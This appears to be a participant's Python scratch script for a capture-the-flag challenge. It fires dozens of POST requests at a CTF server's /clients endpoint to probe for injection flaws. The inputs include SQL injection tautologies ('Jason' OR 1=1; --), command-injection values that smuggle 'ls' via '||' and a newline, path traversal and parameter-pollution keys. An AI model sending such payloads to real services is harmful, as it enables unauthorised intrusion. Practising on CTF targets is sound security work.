import json
import requests
import urllib.parse

def urlencode(string):
    if isinstance(string, str):
        return urllib.parse.quote_plus(string)
    return string

def vev(data=None, encode=False):
    if data is not None and encode is True:
        data = {k: urlencode(v) for k, v in data.items()}
        r = requests.post('http://spooktoberctf.se:22083/clients', data=data)
    else:
        r = requests.post('http://spooktoberctf.se:22083/clients', data=data)
    if data == {'name': 'Dracula', 'location': 'Transylvania'}:
        print()
    if r.status_code != 200:
        print()
    return r.json()


def jsonvev(data):
    r = requests.post('http://spooktoberctf.se:22083/clients', json=json.dumps(data))
    return r.json()

def bodyvev(data):
    r = requests.post('http://spooktoberctf.se:22083/clients',)


_null = vev(None)
a = vev({'location': 'Gotham'})
b = vev({'name': 'Jason'})
c = vev({'name': 'Ja*'})
cc = vev({'name': 'Ja.*'})
d = vev({'name': 'Ja%'})
e = vev({'name': 'Ja\.\*'})
f = vev({'name': ''})
g = vev({'name': 'Michael Myers'})
h = vev({'name': '%'})
i = vev({'name': '*'})
j = vev({'name': '.*'})
k = vev({'name': '\\.\\*'})
l = vev({'name': '\\\.\\\*'})
m = vev({'name': b'\x00'})
n = vev({'name': 'Dracula', 'location': 'Transylvania'})
o = vev({'location': 'Gotham City'})
p = vev({'location': 'Transylvania\" or 1=1; --'})
q = vev({'name': 'Jason\' OR 1=1; --'})
r = vev({'location': 'Transylvania'})
rr = vev({'name': 'OR+1%3D1%3B--'})
rrr = vev({'location': 'Häst'})
rrrr = vev({'all': '*'})
rrrrr = vev({'location': '../ #'})
rrrrrr = vev({"name": "aa|| ls . # "})
rrrrrrr = vev({"Jason'or'1'='1": ''})
rrrrrrrr = vev({"%0als .": ''})

payload = {
"name": "Jason",
"location[name]": "Jason"
}
rrrrrrrrr = vev(payload)

r1 = vev({'location': 's'})
r2 = vev({'location': 'sp'})
r3 = vev({'location': 'spo'})
r4 = vev({'location': 'spoo'})
r5 = vev({'location': 'spook'})
r6 = vev({'location': 'Timbuktu'})
rrrrrrrrrrr = vev({'name': 'Jason', "location": "Transylvania"})
rarararararararar = vev({'name': "['Jason','Dracula]"})
rrrrrrrrrrrr = vev({b'name': b'Jason'})
rararararara = vev({'name': 'Jaso'})
rbrbrbrbrbrb = vev({'id': 0})
# #rrrrrrrrrrrr = vev({'%00': 'Jason'})
print()